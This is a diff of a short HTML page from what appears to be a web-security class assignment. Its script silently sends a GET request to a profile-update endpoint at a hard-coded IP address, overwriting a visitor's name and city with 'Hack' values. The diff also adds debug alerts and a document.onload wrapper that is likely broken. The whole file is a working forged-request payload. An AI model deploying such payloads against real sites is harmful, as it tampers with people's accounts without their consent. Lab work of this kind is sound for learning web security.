@@ -1,11 +1,15 @@
 <!DOCTYPE html>
 <html>
 <script>
+document.onload = function () {
+    alert("HEY 1");
     var xmlHttp = null;
 
     xmlHttp = new XMLHttpRequest();
     xmlHttp.open( "GET", "http://67.208.233.162/XSSAssignment/Profile.php?fnameBox=HackFirstName&lnameBox=HackLdsdsdsdastName&cityBox=HackVille&submit=Update", false );
     xmlHttp.send( null );
+    alert("HEY 2");
+}
 </script>
 <body>
 
